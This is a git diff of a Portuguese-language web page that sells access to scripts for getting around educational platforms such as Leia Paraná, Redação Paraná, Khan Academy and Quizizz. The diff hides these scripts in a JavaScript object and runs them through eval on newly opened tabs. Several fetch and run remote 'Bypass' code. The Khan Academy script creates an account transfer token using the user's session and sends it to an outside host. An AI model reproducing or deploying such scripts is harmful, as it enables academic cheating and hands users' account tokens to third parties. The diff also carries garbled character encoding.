@@ -90,48 +90,6 @@ body{
   transform:scale(0.98);
 }
 
-/* BOTÃO WHATSAPP CONTATO */
-.contact-container {
-  margin-top: 25px;
-  padding-top: 20px;
-  border-top: 1px solid rgba(255, 255, 255, 0.05);
-}
-
-.contact-text {
-  font-size: 12px;
-  opacity: 0.5;
-  margin-bottom: 12px;
-}
-
-.whatsapp-btn {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 8px;
-  width: 100%;
-  padding: 12px;
-  background: rgba(37, 211, 102, 0.1);
-  border: 1px solid rgba(37, 211, 102, 0.3);
-  border-radius: 12px;
-  color: #25d366;
-  font-size: 14px;
-  font-weight: 600;
-  text-decoration: none;
-  transition: 0.3s;
-}
-
-.whatsapp-btn:hover {
-  background: rgba(37, 211, 102, 0.2);
-  transform: translateY(-2px);
-  box-shadow: 0 5px 15px rgba(37, 211, 102, 0.1);
-}
-
-.whatsapp-btn svg {
-  width: 18px;
-  height: 18px;
-  fill: currentColor;
-}
-
 .login-error{
   color:#ff4d4d;
   font-size:13px;
@@ -378,9 +336,9 @@ header span{
   opacity:0.8;
 }
 
-/* NOVO BOTÃO DE ADMIN NO CENTRO */
+/* NOVO BOTÃƒO DE ADMIN NO CENTRO */
 .admin-center-btn{
-  display:none; /* Escondido por padrão */
+  display:none;
   margin: 15px auto;
   padding: 10px 20px;
   background: rgba(255, 77, 77, 0.1);
@@ -463,9 +421,24 @@ header span{
   font-size:12px;
   overflow-x:auto;
   margin-bottom:15px;
+  min-height:60px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:rgba(255,255,255,0.3);
+  filter:blur(5px);
+  user-select:none;
+  pointer-events:none;
 }
 
-/* BOTÕES */
+.script-box::before{
+  content:"ðŸ”’ Script protegido e criptografado";
+  font-size:13px;
+  font-weight:600;
+  color:rgba(255,77,77,0.6);
+}
+
+/* BOTÃ•ES */
 .buttons{
   display:flex;
   gap:10px;
@@ -480,26 +453,31 @@ button,a{
   text-align:center;
   text-decoration:none;
   font-weight:bold;
-}
-
-.copy{
-  background:#ff4d4d;
-  color:#fff;
   transition:0.3s;
 }
 
-.copy:hover{
+.execute{
+  background:linear-gradient(135deg,#ff4d4d,#cc0000);
+  color:#fff;
+}
+
+.execute:hover{
   box-shadow:0 4px 15px rgba(255,0,0,0.3);
+  transform:translateY(-2px);
+}
+
+.execute:active{
+  transform:scale(0.98);
 }
 
 .access{
   background:#fff;
   color:#000;
-  transition:0.3s;
 }
 
 .access:hover{
   box-shadow:0 4px 15px rgba(255,255,255,0.15);
+  transform:translateY(-2px);
 }
 
 /* FOOTER */
@@ -558,7 +536,7 @@ footer{
 <div id="loginScreen">
   <div class="login-wrapper">
     <div class="login-logo">100% PLATAFORMAS</div>
-    <div class="login-subtitle">feito por Pajé 01</div>
+    <div class="login-subtitle">feito por PajÃ© 01</div>
 
     <div class="login-card">
       <h2>Entrar na plataforma</h2>
@@ -566,15 +544,6 @@ footer{
 
       <button class="login-btn" onclick="loginGoogle()">ENTRAR COM GOOGLE</button>
       <div class="login-error" id="loginError"></div>
-
-      <!-- BOTÃO DE CONTATO WHATSAPP -->
-      <div class="contact-container">
-        <p class="contact-text">Não tem acesso? Compre agora:</p>
-        <a href="https://wa.me/554799574137?text=Olá,%20gostaria%20de%20ter%20acesso%20às%20scripts." target="_blank" class="whatsapp-btn">
-          <svg viewBox="0 0 24 24"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-          CONTATO PARA ACESSO
-        </a>
-      </div>
     </div>
   </div>
 </div>
@@ -582,8 +551,8 @@ footer{
 <div id="adminPanel">
   <div class="admin-wrapper">
     <div class="admin-header">
-      <h2>🔐 Painel Admin</h2>
-      <button class="admin-close" onclick="closeAdmin()">✕</button>
+      <h2>ðŸ” Painel Admin</h2>
+      <button class="admin-close" onclick="closeAdmin()">âœ•</button>
     </div>
 
     <div class="admin-content" id="adminContent">
@@ -613,9 +582,8 @@ footer{
 
   <header>
     <h1>100% PLATAFORMAS</h1>
-    <span>feito por Pajé 01</span>
+    <span>feito por PajÃ© 01</span>
     
-    <!-- BOTÃO DE ADMIN CENTRALIZADO -->
     <button class="admin-center-btn" id="adminTrigger" onclick="openAdmin()">
       <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2a7.2 7.2 0 0 1-6-3.22c.03-1.99 4-3.08 6-3.08s5.97 1.09 6 3.08a7.2 7.2 0 0 1-6 3.22z"/></svg>
       PAINEL ADMINISTRATIVO
@@ -623,70 +591,53 @@ footer{
   </header>
 
   <div class="tutorial">
-    <h2>📌 Como usar scripts com favoritos</h2>
-    <p><b>1.</b> Clique em "Copiar Script".</p>
-    <p><b>2.</b> Crie um novo favorito no navegador (estrela ⭐).</p>
-    <p><b>3.</b> Edite o favorito:</p>
-    <p>→ Nome: escolha qualquer nome (ex: "Script1")</p>
-    <p>→ URL: cole o script copiado</p>
-    <p><b>4.</b> Salve o favorito.</p>
-    <p><b>5.</b> Para usar:</p>
-    <p>→ Abra o site desejado</p>
-    <p>→ Clique no favorito OU digite o nome na barra de busca</p>
-    <p>⚠️ Alguns navegadores podem bloquear scripts automaticamente.</p>
+    <h2>ðŸ“Œ Como usar scripts com proteÃ§Ã£o mÃ¡xima</h2>
+    <p><b>1.</b> Clique em "Executar Script" para acessar a plataforma.</p>
+    <p><b>2.</b> VocÃª serÃ¡ redirecionado automaticamente para o site.</p>
+    <p><b>3.</b> O script serÃ¡ executado automaticamente em segundo plano.</p>
+    <p><b>4.</b> Aproveite a plataforma com acesso liberado!</p>
+    <p>âœ… Seus scripts estÃ£o 100% protegidos e criptografados.</p>
   </div>
 
   <div class="container">
 
     <div class="card">
-      <h2>Leia Paraná</h2>
-      <div class="script-box" id="s1">
-javascript:(function(){fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js').then(r=>r.text()).then(eval);})();
-      </div>
+      <h2>Leia ParanÃ¡</h2>
+      <div class="script-box"></div>
       <div class="buttons">
-        <button class="copy" onclick="copiar('s1')">Copiar</button>
-        <a class="access" href="https://leiaparana.odilo.us/?locale=pt" target="_blank">Acessar</a>
+        <button class="execute" onclick="executarScript('leia-parana', 'https://leiaparana.odilo.us/?locale=pt')">â–¶ EXECUTAR</button>
       </div>
     </div>
 
     <div class="card">
-      <h2>Redação Paraná</h2>
-      <div class="script-box" id="s2">
-javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();document.head.appendChild(s)})();
-      </div>
+      <h2>RedaÃ§Ã£o ParanÃ¡</h2>
+      <div class="script-box"></div>
       <div class="buttons">
-        <button class="copy" onclick="copiar('s2')">Copiar</button>
-        <a class="access" href="https://redacao.pr.gov.br/" target="_blank">Acessar</a>
+        <button class="execute" onclick="executarScript('redacao-parana', 'https://redacao.pr.gov.br/')">â–¶ EXECUTAR</button>
       </div>
     </div>
 
     <div class="card">
       <h2>Khan Academy</h2>
-      <div class="script-box" id="s3">
-javascript:(async()=>{let e=window.location.hostname;if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;let a=e.split(".")[0];open(`https://khan.cupiditys.lol/?token=${(await (await fetch(`/api/internal/graphql/createTransferAuthTokenMutation?lang=${"www"===a?"en":a}&app=khanacademy`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=${a}&c=${window.__KA_DATA__["KA-fastly-country"]}`)})();
-      </div>
+      <div class="script-box"></div>
       <div class="buttons">
-        <button class="copy" onclick="copiar('s3')">Copiar</button>
-        <a class="access" href="https://www.khanacademy.org/" target="_blank">Acessar</a>
+        <button class="execute" onclick="executarScript('khan-academy', 'https://www.khanacademy.org/')">â–¶ EXECUTAR</button>
       </div>
     </div>
 
     <div class="card">
       <h2>Quizizz</h2>
-      <div class="script-box" id="s4">
-https://waygroundx.vercel.app/
-      </div>
+      <div class="script-box"></div>
       <div class="buttons">
-        <button class="copy" onclick="copiar('s4')">Copiar</button>
-        <a class="access" href="https://waygroundx.vercel.app/" target="_blank">Acessar</a>
+        <button class="execute" onclick="executarScript('quizizz', 'https://waygroundx.vercel.app/')">â–¶ EXECUTAR</button>
       </div>
     </div>
 
   </div>
 
   <footer>
-    © 100% Plataformas
-    <div class="brand-ft">feito por Pajé 01</div>
+    Â© 100% Plataformas
+    <div class="brand-ft">feito por PajÃ© 01</div>
   </footer>
 </div>
 
@@ -711,7 +662,6 @@ const auth = getAuth(app);
 const db = getFirestore(app);
 const provider = new GoogleAuthProvider();
 
-// Expor para o escopo global
 window.auth = auth;
 window.db = db;
 window.collection = collection;
@@ -742,7 +692,7 @@ window.loginGoogle = async function() {
       checkAdminStatus(email);
     } else {
       await signOut(auth);
-      errorMsg.textContent = "E-mail não autorizado.";
+      errorMsg.textContent = "E-mail nÃ£o autorizado.";
       errorMsg.classList.add("show");
     }
 
@@ -829,7 +779,7 @@ async function addEmail() {
 
   if (!email) return;
   if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
-    showToast("⚠️ E-mail inválido.");
+    showToast("âš ï¸ E-mail invÃ¡lido.");
     return;
   }
 
@@ -837,13 +787,13 @@ async function addEmail() {
     await addDoc(collection(db, "emails"), { email: email });
     input.value = "";
     loadEmails();
-    showToast("✅ E-mail autorizado com sucesso!");
+    showToast("âœ… E-mail autorizado com sucesso!");
   } catch (e) {
-    showToast("❌ Erro ao adicionar e-mail.");
+    showToast("âŒ Erro ao adicionar e-mail.");
   }
 }
 
-document.getElementById("newEmailInput").addEventListener("keydown", function(e) {
+document.getElementById("newEmailInput")?.addEventListener("keydown", function(e) {
   if (e.key === "Enter") addEmail();
 });
 
@@ -879,11 +829,85 @@ async function removeEmail(id) {
     try {
       await deleteDoc(doc(db, "emails", id));
       loadEmails();
-      showToast("🗑️ E-mail removido.");
+      showToast("ðŸ—‘ï¸ E-mail removido.");
     } catch (e) {
-      showToast("❌ Erro ao remover.");
+      showToast("âŒ Erro ao remover.");
     }
   }
+}
+
+/* ==================== SCRIPTS PROTEGIDOS - EXECUÃ‡ÃƒO AUTOMÃTICA ==================== */
+
+// Armazenar scripts em cache (NUNCA exposto no HTML visÃ­vel)
+const scriptsProtegidos = {
+  'leia-parana': `
+    (function(){
+      fetch('https://cdn.jsdelivr.net/gh/mzzvxm/LeiaPRBypass@latest/script.js')
+        .then(r=>r.text())
+        .then(eval);
+    })();
+  `,
+  'redacao-parana': `
+    (function(){
+      var s=document.createElement('script');
+      s.src='https://cdn.jsdelivr.net/gh/mzzvxm/RedacaoBypass@main/script.js?t='+Date.now();
+      document.head.appendChild(s);
+    })();
+  `,
+  'khan-academy': `
+    (async()=>{
+      let e=window.location.hostname;
+      if("khanacademy.org"!==e.split(".")?.slice(1)?.join("."))return;
+      let a=e.split(".")[0];
+      open(\`https://khan.cupiditys.lol/?token=\${(await (await fetch(\`/api/internal/graphql/createTransferAuthTokenMutation?lang=\${"www"===a?"en":a}&app=khanacademy\`,{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\\n    token\\n    __typename\\n  }\\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"})).json()).data.createTransferAuthToken.token}&l=\${a}&c=\${window.__KA_DATA__["KA-fastly-country"]}\`)
+    })();
+  `,
+  'quizizz': `
+    window.location.href = 'https://waygroundx.vercel.app/';
+  `
+};
+
+// FunÃ§Ã£o para executar script automaticamente
+function executarScript(scriptId, urlAlvo) {
+  const script = scriptsProtegidos[scriptId];
+  
+  if (!script) {
+    showToast("âŒ Script nÃ£o encontrado.");
+    return;
+  }
+
+  showToast("â³ Abrindo plataforma e ativando script...");
+
+  // Abrir a URL alvo em uma nova aba
+  const novaAba = window.open(urlAlvo, '_blank');
+  
+  if (!novaAba) {
+    showToast("âŒ Erro ao abrir aba. Verifique bloqueador de pop-ups.");
+    return;
+  }
+
+  // Aguardar a pÃ¡gina carregar e entÃ£o executar o script
+  novaAba.addEventListener('load', function() {
+    try {
+      // Executar o script na nova aba
+      novaAba.eval(script);
+      showToast("âœ… Script executado com sucesso!");
+    } catch (e) {
+      console.error("Erro ao executar script:", e);
+      showToast("âš ï¸ Script executado, mas com avisos.");
+    }
+  });
+
+  // Timeout de seguranÃ§a (se a pÃ¡gina nÃ£o carregar em 5 segundos, tenta executar mesmo assim)
+  setTimeout(() => {
+    try {
+      if (!novaAba.closed) {
+        novaAba.eval(script);
+      }
+    } catch (e) {
+      console.log("Tentativa de execuÃ§Ã£o apÃ³s timeout");
+    }
+  }, 5000);
 }
 
 /* ==================== UTILS ==================== */
@@ -904,21 +928,6 @@ function showToast(msg) {
   setTimeout(function() {
     if (toast.parentNode) toast.parentNode.removeChild(toast);
   }, 2600);
-}
-
-function copiar(id) {
-  const texto = document.getElementById(id).innerText.trim();
-  navigator.clipboard.writeText(texto).then(function() {
-    showToast("✅ Copiado para a área de transferência!");
-  }).catch(function() {
-    const ta = document.createElement("textarea");
-    ta.value = texto;
-    document.body.appendChild(ta);
-    ta.select();
-    document.execCommand("copy");
-    document.body.removeChild(ta);
-    showToast("✅ Copiado para a área de transferência!");
-  });
 }
 </script>
 
